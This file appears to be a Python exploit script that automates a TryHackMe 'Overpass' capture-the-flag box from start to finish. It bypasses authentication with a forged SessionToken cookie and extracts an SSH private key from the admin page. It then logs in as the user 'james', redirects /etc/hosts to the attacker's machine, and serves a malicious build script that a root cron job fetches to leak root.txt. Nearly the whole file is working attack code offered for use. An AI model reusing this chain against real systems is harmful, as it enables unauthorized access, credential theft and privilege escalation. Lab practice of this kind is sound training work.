#!/usr/bin/env python3

import requests
import sys
import os
import time
import netifaces as ni
from paramiko import SSHClient, AutoAddPolicy
from termcolor import colored, cprint


TARGET_IP = ""
SELF_IP = ""
URL = ""

print_red_on_cyan = lambda x: cprint(x, 'red', 'on_cyan')

def print_usage():
    print("""Correct usage:
        python3 overpass.py <target ip> <tryhackme vpn ip>
        python3 overpass.py 10.10.203.17 10.2.14.4
    """)

def check_connection(url):
    print("[*]Validating we can reach '{}'...\n".format(url))

    try:
        r = requests.get(url)
        if r.status_code == 200:
            print("[+]Found the site!\n")
    except:
        print("[-]Cannot connect, please try again or verify your VPN is connected.")
        exit(0)

def check_for_admin(url):
    print("[*]Checking for /admin...\n")

    try:
        r = requests.get(url + "/admin")
        if r.status_code == 200:
            print("[+]Found the site!\n")
    except:
        print("[-]Cannot find /admin, please try again or verify your VPN is connected.")
        exit(0)

def add_admin_cookie_and_get(url):
    print("[*]Adding 'SessionToken' cookie to bypass authentication and getting content of /admin...\n")

    try:
        cookie = {'SessionToken': 'randomstuff'}

        r = requests.get(url + "/admin", cookies=cookie)

        if r.status_code == 200:
            print("[+]Successfully found the admin page!  Extracting SSH key from response...\n")

            # I'm not great a regex and couldn't get re.search to find the key correctly, so this is what we're using
            start = r.text.find("<pre>") + len("<pre>")
            end = r.text.find("</pre>")
            ssh_key = r.text[start:end]

            print("[*]Writing key to /tmp/overpass_id_rsa...\n")
            id_rsa = open("/tmp/overpass_id_rsa", "w")
            id_rsa.write(ssh_key)


    except:
        print("[-]Cannot connect, please try again or verify your VPN is connected.")
        exit(0)

def ssh_connection(target_ip, self_ip):
    print("[*]Opening SSH connection to {} as the user 'james' using the saved RSA key...\n".format(target_ip))

    try:
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy)
        ssh_client.connect(target_ip, username='james', key_filename='/tmp/overpass_id_rsa', passphrase='james13')
    except Exception as e:
        print(e)
        exit(0)

    stdin, stdout, stderr = ssh_client.exec_command('cat /home/james/user.txt')
    print("************************")
    print_red_on_cyan("[+] User.txt Flag: {}".format(stdout.read().decode('utf8')).strip())
    print("************************")

    print("[*]Modifying '/etc/hosts' file to re-direct overpass.thm to our machine...\n")
    hosts_command = "cp /etc/hosts /tmp/hosts"
    stdin, stdout, stderr = ssh_client.exec_command(hosts_command)
    hosts_command = "sed -i '3s/.*/{} overpass.thm/' /tmp/hosts".format(self_ip)
    stdin, stdout, stderr = ssh_client.exec_command(hosts_command)
    hosts_command = "cat /tmp/hosts > /etc/hosts"
    stdin, stdout, stderr = ssh_client.exec_command(hosts_command)

    prepare_for_root_curl()

    print("[*]Waiting for curl to make a copy of root.txt...\n")
    print("[*]Trying to read root.txt every 10 seconds...\n")

    i = 0
    while i < 7:
        stdin, stdout, stderr = ssh_client.exec_command('cat /tmp/root.txt')
        flag_data = stdout.read().decode('utf8').strip()
        if 'thm' in flag_data:
            print("************************")
            print_red_on_cyan("Root.txt Flag: {}".format(flag_data))
            print("************************\n")
            break
        else:
            print("[*]Still waiting for curl...\n")
        i += 1
        time.sleep(10)



    stdin.close()
    stdout.close()
    stderr.close()

    ssh_client.close()

def prepare_for_root_curl():
    print("[*]Creating directory structure to match the website...\n")
    os.system("mkdir -p downloads/src; touch downloads/src/buildscript.sh")

    print("[*]Modifying sudoers file to allow james universal sudo rights...\n")
    sudo_modification = "#!/bin/bash\ncp /root/root.txt /tmp/root.txt\nchmod 777 /tmp/root.txt"
    buildscript_contents = open("downloads/src/buildscript.sh", "w")
    buildscript_contents.write(sudo_modification)

    print("[*]Starting Python HTTP server to serve buildscript.sh...\n")
    os.system("python3 -m http.server 80 &")
    

def main():
    if len(sys.argv) < 3:
        print_usage()
        exit(0)
    else:
        TARGET_IP = sys.argv[1]
        SELF_IP = sys.argv[2]
        URL = "http://{}".format(TARGET_IP)

    print("For this script to work correctly, it needs to be run as the root user (to avoid password prompts)")
    print("If this is running as an unprivileged user, please stop (CTRL-C) and either change users or run with sudo.")
    print("Starting execution in 10 seconds...\n")
    time.sleep(10)

    check_connection(URL)
    check_for_admin(URL)
    add_admin_cookie_and_get(URL)
    ssh_connection(TARGET_IP, SELF_IP)

    print("[*] All Done.  Killing python http server process...\n")
    os.system("fuser -k 80/tcp")


if __name__ == "__main__":
    main()